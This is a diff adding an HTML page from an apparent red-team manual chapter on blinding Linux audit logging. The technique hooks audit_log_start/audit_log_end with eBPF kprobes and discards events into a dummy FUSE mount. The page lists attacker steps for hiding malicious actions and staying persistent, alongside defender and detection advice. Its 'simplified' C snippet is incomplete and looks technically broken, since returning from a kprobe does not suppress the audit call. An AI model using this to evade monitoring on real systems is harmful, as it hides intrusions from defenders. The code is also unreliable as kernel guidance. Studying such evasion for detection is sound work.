@@ -1,0 +1,777 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>The FUSE Audit Black‑Hole | Diabolical eBPF: Linux Red Team Field Manual</title>
+    <meta name="description" content="100 kernel-hacking micro-chapters proving eBPF is all you need.">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="theme-color" content="#000000" media="(prefers-color-scheme: dark)">
+<meta name="theme-color" content="#ffffff" media="(prefers-color-scheme: light)">
+<link rel="stylesheet" href="/dBPF/assets/css/book.css">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+<script src="https://cdn.jsdelivr.net/npm/mermaid@10.6.1/dist/mermaid.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', function() {
+    mermaid.initialize({
+      startOnLoad: true,
+      theme: 'dark'
+    });
+  });
+</script>
+
+    <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>The FUSE Audit Black‑Hole | Diabolical eBPF: Linux Red Team Field Manual</title>
+<meta name="generator" content="Jekyll v3.9.5" />
+<meta property="og:title" content="The FUSE Audit Black‑Hole" />
+<meta name="author" content="Diabolical eBPF" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="The FUSE Audit Black-Hole: Evading Security Monitoring" />
+<meta property="og:description" content="The FUSE Audit Black-Hole: Evading Security Monitoring" />
+<link rel="canonical" href="https://mbhatt1.github.io/dBPF/the-fuse-audit-black-hole.html" />
+<meta property="og:url" content="https://mbhatt1.github.io/dBPF/the-fuse-audit-black-hole.html" />
+<meta property="og:site_name" content="Diabolical eBPF: Linux Red Team Field Manual" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2025-02-02T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="The FUSE Audit Black‑Hole" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Diabolical eBPF"},"dateModified":"2025-02-02T00:00:00+00:00","datePublished":"2025-02-02T00:00:00+00:00","description":"The FUSE Audit Black-Hole: Evading Security Monitoring","headline":"The FUSE Audit Black‑Hole","mainEntityOfPage":{"@type":"WebPage","@id":"https://mbhatt1.github.io/dBPF/the-fuse-audit-black-hole.html"},"url":"https://mbhatt1.github.io/dBPF/the-fuse-audit-black-hole.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+<body>
+    <div class="layout">
+        <nav class="sidebar">
+            <div class="sidebar-header">
+                <a href="/dBPF/" class="site-title">Diabolical eBPF: Linux Red Team Field Manual</a>
+            </div>
+            <div class="sidebar-content">
+                
+                
+                    <a href="/dBPF/the-mirror-controls.html" >
+                        The Mirror Controls
+                    </a>
+                
+                    <a href="/dBPF/the-overlayfs-trojan-horse.html" >
+                        The OverlayFS Trojan Horse
+                    </a>
+                
+                    <a href="/dBPF/the-fuse-audit-black-hole.html" class="active">
+                        The FUSE Audit Black‑Hole
+                    </a>
+                
+                    <a href="/dBPF/the-phantom-syscall.html" >
+                        The Phantom Syscall
+                    </a>
+                
+                    <a href="/dBPF/the-ghost-nic.html" >
+                        The Ghost NIC
+                    </a>
+                
+                    <a href="/dBPF/slipping-the-cgroup-leash.html" >
+                        Slipping the Cgroup Leash
+                    </a>
+                
+                    <a href="/dBPF/silencing-selinux.html" >
+                        Silencing SELinux
+                    </a>
+                
+                    <a href="/dBPF/device-cgroup-houdini.html" >
+                        Device‑cgroup Houdini
+                    </a>
+                
+                    <a href="/dBPF/keyring-heist.html" >
+                        Keyring Heist
+                    </a>
+                
+                    <a href="/dBPF/pid-namespace-doppelg-nger.html" >
+                        PID Namespace Doppelgänger
+                    </a>
+                
+                    <a href="/dBPF/inode-cloak.html" >
+                        Inode Cloak
+                    </a>
+                
+                    <a href="/dBPF/irq-affinity-chaos.html" >
+                        IRQ Affinity Chaos
+                    </a>
+                
+                    <a href="/dBPF/timer-slack-sabotage.html" >
+                        Timer‑Slack Sabotage
+                    </a>
+                
+                    <a href="/dBPF/kernel-event-loop-hijack.html" >
+                        Kernel Event Loop Hijack
+                    </a>
+                
+                    <a href="/dBPF/mount-options-flip.html" >
+                        Mount‑Options Flip
+                    </a>
+                
+                    <a href="/dBPF/hidden-host-device-injection.html" >
+                        Hidden Host Device Injection
+                    </a>
+                
+                    <a href="/dBPF/userfaultfd-escape.html" >
+                        Userfaultfd Escape
+                    </a>
+                
+                    <a href="/dBPF/blkio-phantom-writes.html" >
+                        blkio Phantom Writes
+                    </a>
+                
+                    <a href="/dBPF/netlink-blindspot.html" >
+                        Netlink Blindspot
+                    </a>
+                
+                    <a href="/dBPF/stack-trace-scrubber.html" >
+                        Stack Trace Scrubber
+                    </a>
+                
+                    <a href="/dBPF/kprobe-kill-switch.html" >
+                        Kprobe Kill‑Switch
+                    </a>
+                
+                    <a href="/dBPF/bpf-rootkit-resurrection.html" >
+                        BPF Rootkit Resurrection
+                    </a>
+                
+                    <a href="/dBPF/uaf-cache-reheat.html" >
+                        UAF Cache Reheat
+                    </a>
+                
+                    <a href="/dBPF/transparent-hugepage-trap.html" >
+                        Transparent Hugepage Trap
+                    </a>
+                
+                    <a href="/dBPF/ebpf-nftables-side-door.html" >
+                        eBPF + nftables Side‑Door
+                    </a>
+                
+                    <a href="/dBPF/dns-rebind-wizard.html" >
+                        DNS Rebind Wizard
+                    </a>
+                
+                    <a href="/dBPF/tcp-window-whisper.html" >
+                        TCP Window Whisper
+                    </a>
+                
+                    <a href="/dBPF/rdma-sneak-path.html" >
+                        RDMA Sneak‑path
+                    </a>
+                
+                    <a href="/dBPF/pci-hotplug-phantom.html" >
+                        PCI Hotplug Phantom
+                    </a>
+                
+                    <a href="/dBPF/ebpf-signed-driver-swap.html" >
+                        eBPF Signed‑Driver Swap
+                    </a>
+                
+                    <a href="/dBPF/kexec-quiet-launch.html" >
+                        Kexec Quiet Launch
+                    </a>
+                
+                    <a href="/dBPF/crash-dump-key-leak.html" >
+                        Crash‑dump Key Leak
+                    </a>
+                
+                    <a href="/dBPF/efi-var-ghost.html" >
+                        EFI Var Ghost
+                    </a>
+                
+                    <a href="/dBPF/spectre-gadget-amplifier.html" >
+                        Spectre Gadget Amplifier
+                    </a>
+                
+                    <a href="/dBPF/avx-frequency-dos.html" >
+                        AVX Frequency DoS
+                    </a>
+                
+                    <a href="/dBPF/gpu-memory-exfil.html" >
+                        GPU Memory Exfil
+                    </a>
+                
+                    <a href="/dBPF/hpe-ilo-packet-ride.html" >
+                        HPE ILO Packet Ride
+                    </a>
+                
+                    <a href="/dBPF/numa-node-eviction.html" >
+                        NUMA Node Eviction
+                    </a>
+                
+                    <a href="/dBPF/powercap-override.html" >
+                        Powercap Override
+                    </a>
+                
+                    <a href="/dBPF/thermal-trip-faker.html" >
+                        Thermal Trip Faker
+                    </a>
+                
+                    <a href="/dBPF/energy-meter-spoof.html" >
+                        Energy Meter Spoof
+                    </a>
+                
+                    <a href="/dBPF/ras-event-flood.html" >
+                        RAS Event Flood
+                    </a>
+                
+                    <a href="/dBPF/iommu-map-slip.html" >
+                        IOMMU Map Slip
+                    </a>
+                
+                    <a href="/dBPF/sched-fifo-impersonator.html" >
+                        SCHED_FIFO Impersonator
+                    </a>
+                
+                    <a href="/dBPF/ksm-cross-vm-peek.html" >
+                        KSM Cross‑VM Peek
+                    </a>
+                
+                    <a href="/dBPF/perf-ring-flood.html" >
+                        Perf Ring Flood
+                    </a>
+                
+                    <a href="/dBPF/ebpf-ptrace-duo.html" >
+                        EBPF + ptrace Duo
+                    </a>
+                
+                    <a href="/dBPF/page-table-spray.html" >
+                        Page Table Spray
+                    </a>
+                
+                    <a href="/dBPF/dma-buf-relay.html" >
+                        DMA‑Buf Relay
+                    </a>
+                
+                    <a href="/dBPF/sysrq-shadow.html" >
+                        Sysrq Shadow
+                    </a>
+                
+                    <a href="/dBPF/ftrace-backdoor.html" >
+                        ftrace Backdoor
+                    </a>
+                
+                    <a href="/dBPF/time-namespace-warp.html" >
+                        Time‑Namespace Warp
+                    </a>
+                
+                    <a href="/dBPF/sid-swap-every-tick.html" >
+                        SID Swap Every Tick
+                    </a>
+                
+                    <a href="/dBPF/seccomp-notify-storm.html" >
+                        SECCOMP Notify Storm
+                    </a>
+                
+                    <a href="/dBPF/bpf-lsm-toggle.html" >
+                        BPF LSM Toggle
+                    </a>
+                
+                    <a href="/dBPF/bpf-map-dead-drop.html" >
+                        BPF Map Dead‑Drop
+                    </a>
+                
+                    <a href="/dBPF/veth-mac-masquerade.html" >
+                        Veth MAC Masquerade
+                    </a>
+                
+                    <a href="/dBPF/xfrm-policy-eraser.html" >
+                        XFRM Policy Eraser
+                    </a>
+                
+                    <a href="/dBPF/ipv6-ra-surprise.html" >
+                        IPv6 RA Surprise
+                    </a>
+                
+                    <a href="/dBPF/ebpf-bpf-lsm-lockout.html" >
+                        eBPF + BPF LSM Lockout
+                    </a>
+                
+                    <a href="/dBPF/io-uring-double-dip.html" >
+                        IO_uring Double Dip
+                    </a>
+                
+                    <a href="/dBPF/swap-off-bomb.html" >
+                        Swap‑off Bomb
+                    </a>
+                
+                    <a href="/dBPF/md-raid-fake-event.html" >
+                        md‑raid Fake Event
+                    </a>
+                
+                    <a href="/dBPF/crypto-api-overlay.html" >
+                        crypto API Overlay
+                    </a>
+                
+                    <a href="/dBPF/nfqueue-siphon.html" >
+                        NFqueue Siphon
+                    </a>
+                
+                    <a href="/dBPF/rseq-side-switch.html" >
+                        RSeq Side‑Switch
+                    </a>
+                
+                    <a href="/dBPF/vmsplice-burst.html" >
+                        vmsplice Burst
+                    </a>
+                
+                    <a href="/dBPF/bpf-prog-array-chain.html" >
+                        BPF Prog‑Array Chain
+                    </a>
+                
+                    <a href="/dBPF/task-work-hijack.html" >
+                        task_work Hijack
+                    </a>
+                
+                    <a href="/dBPF/bpf-lsm-fanotify-spy.html" >
+                        BPF Lsm + Fanotify Spy
+                    </a>
+                
+                    <a href="/dBPF/hid-gadget-relay.html" >
+                        HID Gadget Relay
+                    </a>
+                
+                    <a href="/dBPF/usbip-packet-morph.html" >
+                        USBIP Packet Morph
+                    </a>
+                
+                    <a href="/dBPF/ebpftrace-ghost.html" >
+                        ebpftrace Ghost
+                    </a>
+                
+                    <a href="/dBPF/socket-cookie-clash.html" >
+                        Socket Cookie Clash
+                    </a>
+                
+                    <a href="/dBPF/netns-vlan-ghost.html" >
+                        NetNS VLAN Ghost
+                    </a>
+                
+                    <a href="/dBPF/mount-setattr-shuffle.html" >
+                        mount_setattr Shuffle
+                    </a>
+                
+                    <a href="/dBPF/selinux-netlabel-null.html" >
+                        SELinux Netlabel Null
+                    </a>
+                
+                    <a href="/dBPF/overlayfs-index-misdirect.html" >
+                        OverlayFS Index Misdirect
+                    </a>
+                
+                    <a href="/dBPF/ioctl-reply-forgery.html" >
+                        ioctl Reply Forgery
+                    </a>
+                
+                    <a href="/dBPF/seccomp-tid-hop.html" >
+                        Seccomp TID Hop
+                    </a>
+                
+                    <a href="/dBPF/process-mprotect-piggyback.html" >
+                        process_mprotect Piggyback
+                    </a>
+                
+                    <a href="/dBPF/bpf-jit-spray.html" >
+                        BPF JIT Spray
+                    </a>
+                
+                    <a href="/dBPF/ebpf-kfunc-abuse.html" >
+                        ebpf_kfunc Abuse
+                    </a>
+                
+                    <a href="/dBPF/printk-mute-switch.html" >
+                        printk Mute Switch
+                    </a>
+                
+                    <a href="/dBPF/pmu-counter-jam.html" >
+                        PMU Counter Jam
+                    </a>
+                
+                    <a href="/dBPF/ebpf-kernel-exec.html" >
+                        EBPF kernel_exec
+                    </a>
+                
+                    <a href="/dBPF/binder-parcel-peek.html" >
+                        binder Parcel Peek
+                    </a>
+                
+                    <a href="/dBPF/ashmem-snooper.html" >
+                        ashmem Snooper
+                    </a>
+                
+                    <a href="/dBPF/fuse-deadlock-dos.html" >
+                        FUSE Deadlock DoS
+                    </a>
+                
+                    <a href="/dBPF/ebpf-cgroup-sock-release.html" >
+                        EBPF-Cgroup Sock Release
+                    </a>
+                
+                    <a href="/dBPF/kfence-leak.html" >
+                        KFENCE Leak
+                    </a>
+                
+                    <a href="/dBPF/pstore-silent-drop.html" >
+                        pstore Silent Drop
+                    </a>
+                
+                    <a href="/dBPF/audit-trigger-smother.html" >
+                        audit_trigger Smother
+                    </a>
+                
+                    <a href="/dBPF/taskstats-leak.html" >
+                        taskstats Leak
+                    </a>
+                
+                    <a href="/dBPF/videobuf-shadow.html" >
+                        VIDEOBUF Shadow
+                    </a>
+                
+                    <a href="/dBPF/mmu-notifier-detour.html" >
+                        mmu_notifier Detour
+                    </a>
+                
+                    <a href="/dBPF/acpi-wsmi-ping.html" >
+                        ACPI WSMI Ping
+                    </a>
+                
+                    <a href="/dBPF/netfilter-log-rewriter.html" >
+                        netfilter Log Rewriter
+                    </a>
+                
+                    <a href="/dBPF/ebpf-token-bypass.html" >
+                        EBPF Token Bypass
+                    </a>
+                
+            </div>
+        </nav>
+
+        <div class="content-wrapper">
+            <main class="content">
+                <article class="post">
+                    <header class="post-header">
+                        <h1 class="post-title">The FUSE Audit Black‑Hole</h1>
+                        
+                        <time class="post-date" datetime="2025-02-02T00:00:00+00:00">
+                            February 02, 2025
+                        </time>
+                        
+                    </header>
+
+                    <div class="post-content">
+                        <h1 id="the-fuse-audit-black-hole-evading-security-monitoring">The FUSE Audit Black-Hole: Evading Security Monitoring</h1>
+
+<p><strong>Wut</strong></p>
+
+<p>Redirecting kernel audit buffers into a dummy FUSE mount so SELinux and auditd never record the attacker’s tracks. This technique allows attackers to perform malicious actions without leaving evidence in security logs, creating a “black hole” for audit events.</p>
+
+<pre><code class="language-mermaid">graph TD
+    A[Kernel Audit Event] --&gt;|1. Generated| B[Audit Buffer]
+    B --&gt;|2. Intercept| C[eBPF Program]
+    C --&gt;|3. Redirect| D[Dummy FUSE Mount]
+    D --&gt;|4. Discard| F[/dev/null]
+    B --&gt;|5. Miss| E[SELinux/Auditd]
+    G[Attacker Actions] --&gt;|6. No Logs| H[Stealth Operations]
+</code></pre>
+
+<p><strong>Why</strong></p>
+
+<p>Because eBPF + misconfiguration =&gt; broken isolation. Audit logs are a critical security control for detecting and investigating security incidents. By intercepting audit events before they reach monitoring systems like SELinux and auditd, attackers can operate with significantly reduced risk of detection, effectively blinding security monitoring tools.</p>
+
+<p><strong>POC</strong></p>
+
+<p><em>Coming soon.</em></p>
+
+<p>The proof of concept will demonstrate:</p>
+<ul>
+  <li>Creating a dummy FUSE filesystem to act as an audit sink</li>
+  <li>Using eBPF to intercept audit events in the kernel</li>
+  <li>Redirecting specific audit events to the FUSE mount</li>
+  <li>Performing malicious actions without generating audit logs</li>
+  <li>Maintaining the redirection across system reboots</li>
+</ul>
+
+<p><strong>Attacker hat on</strong></p>
+
+<ol>
+  <li>Identify a target system with eBPF capabilities and audit logging</li>
+  <li>Create a dummy FUSE filesystem mount point</li>
+  <li>Develop an eBPF program that hooks into the kernel’s audit subsystem</li>
+  <li>Load the malicious BPF program with appropriate privileges</li>
+  <li>Configure the program to redirect specific audit events to the FUSE mount</li>
+  <li>Perform malicious actions without leaving audit trails</li>
+  <li>Establish persistence for both the FUSE mount and eBPF program</li>
+</ol>
+
+<p><strong>Defender hat on</strong></p>
+
+<ol>
+  <li>Remove CAP_BPF from untrusted processes and containers</li>
+  <li>Implement BPF LSM policies to restrict eBPF program loading</li>
+  <li>Monitor for unexpected FUSE mounts and eBPF programs</li>
+  <li>Use multiple, independent audit collection mechanisms</li>
+  <li>Implement integrity monitoring for the audit subsystem</li>
+  <li>Consider using eBPF-based security tools that can detect malicious eBPF usage</li>
+</ol>
+
+<p><strong>Conclusion</strong></p>
+
+<p><code class="language-plaintext highlighter-rouge">eBPF is all you need</code>. The ability to intercept and redirect kernel audit events through eBPF provides attackers with powerful primitives to evade security monitoring. This technique highlights the importance of treating eBPF capabilities as privileged operations that should be tightly controlled, especially in environments where audit logging is a critical security control.</p>
+
+<h2 id="technical-details">Technical Details</h2>
+
+<h3 id="audit-subsystem-architecture">Audit Subsystem Architecture</h3>
+
+<p>The Linux audit subsystem consists of:</p>
+<ul>
+  <li>Kernel components that generate audit events</li>
+  <li>Audit buffers that temporarily store events</li>
+  <li>Userspace tools like auditd that collect and process events</li>
+  <li>Security frameworks like SELinux that use audit events for enforcement</li>
+</ul>
+
+<p>Audit events flow from the kernel through buffers to userspace collectors, providing visibility into security-relevant actions on the system.</p>
+
+<h3 id="exploitation-technique">Exploitation Technique</h3>
+
+<p>The exploit leverages eBPF’s ability to attach to kernel functions that handle audit events. By intercepting these calls, an attacker can:</p>
+
+<ol>
+  <li><strong>Hook audit generation</strong>: Attach to functions like <code class="language-plaintext highlighter-rouge">audit_log_start()</code> or <code class="language-plaintext highlighter-rouge">audit_filter_rule()</code></li>
+  <li><strong>Identify sensitive events</strong>: Filter for specific events that might reveal attacker activity</li>
+  <li><strong>Redirect selected events</strong>: Send targeted events to a dummy FUSE filesystem</li>
+  <li><strong>Preserve normal operation</strong>: Allow non-sensitive events to flow normally</li>
+</ol>
+
+<h3 id="fuse-component">FUSE Component</h3>
+
+<p>The Filesystem in Userspace (FUSE) component acts as a “black hole” for audit events:</p>
+<ul>
+  <li>Creates a userspace-controlled filesystem mount</li>
+  <li>Implements minimal handlers that discard received data</li>
+  <li>Appears as a valid destination for kernel operations</li>
+  <li>Leaves no trace of the redirected audit events</li>
+</ul>
+
+<h3 id="code-snippet">Code Snippet</h3>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+</pre></td><td class="rouge-code"><pre><span class="c1">// Simplified eBPF program to intercept audit events</span>
+<span class="n">SEC</span><span class="p">(</span><span class="s">"kprobe/audit_log_start"</span><span class="p">)</span>
+<span class="kt">int</span> <span class="nf">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_audit_start</span><span class="p">,</span> <span class="k">struct</span> <span class="n">audit_context</span> <span class="o">*</span><span class="n">ctx</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="c1">// Extract audit event details</span>
+    <span class="kt">int</span> <span class="n">type</span><span class="p">;</span>
+    <span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">type</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">type</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">ctx</span><span class="o">-&gt;</span><span class="n">type</span><span class="p">);</span>
+    
+    <span class="c1">// Check if this is an event we want to hide</span>
+    <span class="c1">// For example, hide exec events for specific binaries</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">is_sensitive_event</span><span class="p">(</span><span class="n">ctx</span><span class="p">))</span> <span class="p">{</span>
+        <span class="c1">// Mark this event for redirection</span>
+        <span class="n">u32</span> <span class="n">key</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">u32</span> <span class="n">value</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">redirect_map</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">value</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
+        
+        <span class="c1">// Optionally modify the event to make it seem benign</span>
+        <span class="c1">// This depends on the specific audit event structure</span>
+    <span class="p">}</span>
+    
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// Hook the function that writes to the audit buffer</span>
+<span class="n">SEC</span><span class="p">(</span><span class="s">"kprobe/audit_log_end"</span><span class="p">)</span>
+<span class="kt">int</span> <span class="nf">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_audit_end</span><span class="p">,</span> <span class="k">struct</span> <span class="n">audit_context</span> <span class="o">*</span><span class="n">ctx</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">u32</span> <span class="n">key</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">u32</span> <span class="o">*</span><span class="n">value</span><span class="p">;</span>
+    
+    <span class="c1">// Check if this event was marked for redirection</span>
+    <span class="n">value</span> <span class="o">=</span> <span class="n">bpf_map_lookup_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">redirect_map</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">value</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">value</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="c1">// Redirect to our FUSE mount by modifying the destination</span>
+        <span class="c1">// This is simplified; actual implementation would depend on</span>
+        <span class="c1">// how audit events are routed</span>
+        
+        <span class="c1">// Clear our flag</span>
+        <span class="n">u32</span> <span class="n">zero</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">redirect_map</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">zero</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
+        
+        <span class="c1">// Return early to prevent normal audit processing</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+    
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// FUSE userspace component (simplified)</span>
+<span class="k">static</span> <span class="kt">int</span> <span class="nf">audit_sink_write</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">,</span>
+                           <span class="kt">off_t</span> <span class="n">offset</span><span class="p">,</span> <span class="k">struct</span> <span class="n">fuse_file_info</span> <span class="o">*</span><span class="n">fi</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="c1">// Simply discard the data</span>
+    <span class="c1">// Optionally log it somewhere for the attacker's reference</span>
+    
+    <span class="c1">// Pretend we wrote everything successfully</span>
+    <span class="k">return</span> <span class="n">size</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">static</span> <span class="k">struct</span> <span class="n">fuse_operations</span> <span class="n">audit_sink_ops</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="p">.</span><span class="n">write</span> <span class="o">=</span> <span class="n">audit_sink_write</span><span class="p">,</span>
+    <span class="c1">// Implement other required operations</span>
+<span class="p">};</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="detection-methods">Detection Methods</h3>
+
+<p>Defenders should monitor for:</p>
+<ul>
+  <li>Unexpected eBPF programs attaching to audit-related functions</li>
+  <li>Discrepancies between expected audit events and actual logged events</li>
+  <li>Unusual FUSE mounts, especially those with minimal implementation</li>
+  <li>Gaps in audit logs during periods of system activity</li>
+  <li>Changes to audit configuration or routing</li>
+</ul>
+
+<p>This technique demonstrates why proper eBPF restrictions are critical for maintaining the integrity of security monitoring systems, especially in environments where audit logging is a key security control.</p>
+
+                    </div>
+                </article>
+
+                
+                <nav class="post-nav">
+                    <div class="post-nav-item prev">
+                        
+                        <span class="nav-label">Previous</span>
+                        <a href="/dBPF/the-overlayfs-trojan-horse.html" class="prev">
+                            The OverlayFS Trojan Horse
+                        </a>
+                        
+                    </div>
+                    <div class="post-nav-item next">
+                        
+                        <span class="nav-label">Next</span>
+                        <a href="/dBPF/the-phantom-syscall.html" class="next">
+                            The Phantom Syscall
+                        </a>
+                        
+                    </div>
+                </nav>
+                
+            </main>
+
+            <footer class="site-footer">
+                <div class="footer-content">
+                    <p>&copy; 2025 Diabolical eBPF. All rights reserved.</p>
+                </div>
+            </footer>
+        </div>
+    </div>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Initialize mermaid with custom dark theme
+            mermaid.initialize({
+                startOnLoad: false,
+                theme: 'dark',
+                themeVariables: {
+                    darkMode: true,
+                    background: '#000000',
+                    primaryColor: '#00ff9d',
+                    primaryTextColor: '#00ff9d',
+                    primaryBorderColor: '#00ff9d',
+                    lineColor: '#00ff9d',
+                    secondaryColor: '#ff00f7',
+                    tertiaryColor: '#00c3ff',
+                    nodeBorder: '#00ff9d',
+                    clusterBkg: '#000000',
+                    clusterBorder: '#00ff9d',
+                    edgeLabelBackground: '#000000',
+                    fontFamily: 'JetBrains Mono'
+                }
+            });
+
+            // Find all pre code blocks with mermaid class
+            document.querySelectorAll('pre code.language-mermaid').forEach(function(element) {
+                // Create a div for mermaid
+                var div = document.createElement('div');
+                div.className = 'mermaid';
+                div.style.background = '#000000';
+                div.style.padding = '2em';
+                div.style.borderRadius = '8px';
+                div.style.marginBottom = '2em';
+                div.textContent = element.textContent;
+                // Replace the pre element with the div
+                element.parentElement.replaceWith(div);
+            });
+
+            // Run mermaid
+            mermaid.init();
+        });
+    </script>
+</body>
+</html>
